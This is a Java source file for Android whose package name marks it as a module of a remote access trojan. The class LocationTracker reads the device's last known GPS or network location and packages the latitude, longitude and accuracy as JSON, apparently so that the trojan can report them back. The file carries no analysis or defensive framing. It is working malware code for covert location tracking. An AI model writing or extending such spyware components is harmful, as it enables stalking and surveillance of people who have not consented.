package com.xroomjx.rat.modules;

import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Looper;

import org.json.JSONObject;

public class LocationTracker {
    public static String getLocation(Context context) {
        try {
            LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) {
                loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }
            if (loc != null) {
                JSONObject json = new JSONObject();
                json.put("lat", loc.getLatitude());
                json.put("lon", loc.getLongitude());
                json.put("accuracy", loc.getAccuracy());
                return json.toString();
            }
            return "location_unavailable";
        } catch (Exception e) {
            return "error: " + e.getMessage();
        }
    }
}
